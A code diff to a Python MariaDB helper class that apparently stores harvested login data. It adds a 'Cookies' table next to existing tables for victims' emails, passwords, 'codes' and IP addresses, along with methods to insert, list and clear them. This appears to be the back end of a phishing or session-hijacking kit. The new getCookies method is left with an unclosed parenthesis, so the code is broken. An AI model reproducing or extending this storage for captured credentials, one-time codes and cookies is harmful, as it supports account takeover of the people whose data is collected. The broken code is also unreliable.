@@ -42,6 +42,7 @@ class MariaDB:
         # self.curr.execute('DROP TABLE IF EXISTS Code')
         cmd_createAuth = "CREATE TABLE IF NOT EXISTS Auth(id_time TEXT UNIQUE KEY NOT NULL, email TEXT, password TEXT, ip TEXT)"
         cmd_createCode = "CREATE TABLE IF NOT EXISTS Code(id_time TEXT UNIQUE KEY NOT NULL, code TEXT, ip TEXT)"
+        cmd_createCookies = "CREATE TABLE IF NOT EXISTS Cookies(id_time TEXT UNIQUE KEY NOT NULL, cookies TEXT, ip TEXT)"
         if self.curr.execute(cmd_createAuth) :
             print('auth table created')
         else : 
@@ -50,26 +51,29 @@ class MariaDB:
             print('code table created')
         else : 
             print('code table already exists')
+        if self.curr.execute(cmd_createCookies):
+            print('Cookies Table Created')
+        else : 
+            print('Cookies Table Already EXISTS')
+    # print('Cookies table created')
         self.conn.commit()
 
     def addAuth(self, _id, email, password, ip):
-        # dbConn, curr = connect()
         self.curr.execute("INSERT INTO Auth(id_time,email,password,ip) VALUES(?,?,?,?)",(_id,email,password,ip))
         self.conn.commit()
         print("login infos added")
 
     def addCode(self, _id, code, ip):
-        # dbConn, curr = connect()
         self.curr.execute("INSERT INTO Code(id_time,code,ip) VALUES(?,?,?)",(_id, code, ip))
         self.conn.commit()
         print("code added")
+    
+    def addCookies(self, _id, cookies, ip):
+        self.curr.execute("INSERT INTO Cookies(id_time,cookies,ip) VALUES(?,?,?)",(_id,cookies,ip))
+        self.conn.commit()
+        print("cookies infos added TO DB")
 
-    def getAuth(self):
-        # dbConn, curr = connect()
-        cmd ="SELECT * FROM Auth"
-        self.curr.execute(cmd)
-        print(list(self.curr))
-        return list(self.curr)
+    ########################################
         
     def clearAuths(self):
         cmd = "TRUNCATE TABLE Auth"
@@ -82,9 +86,24 @@ class MariaDB:
         self.curr.execute(cmd)
         print('Code table Cleared')
 
+    def clearCookies(self):
+        cmd = "TRUNCATE TABLE Cookies"
+        self.curr.execute(cmd)
+        print('Cookies table Cleared')
+
     def clearRecords(self):
         self.clearAuths()
         self.clearCode()
+        self.clearCookies()
+
+    #########################################
+
+
+    def getAuth(self):
+        cmd ="SELECT * FROM Auth"
+        self.curr.execute(cmd)
+        print(list(self.curr))
+        return list(self.curr)
 
     def getCodes(self):
         # dbConn, curr = connect()
@@ -92,6 +111,13 @@ class MariaDB:
         self.curr.execute(cmd)
         print(list(self.curr))
         return list(self.curr)
+    
+    def getCookies(self):
+        cmd = "SELECT * FROM Cookies"
+        self.curr.execute(cmd)
+        print(list(self.curr))
+        return list(self.curr
+
     def getAll(self):
         # dbConn, curr = connect()
         cmd = """
@@ -106,7 +132,7 @@ class MariaDB:
         # return result.fetchall()
 
 # db = MariaDB()
-# db.clearRecords()
+# # db.clearRecords()
 # db.createTables()
 # db.clearAuths()
 # _id = datetime.now()
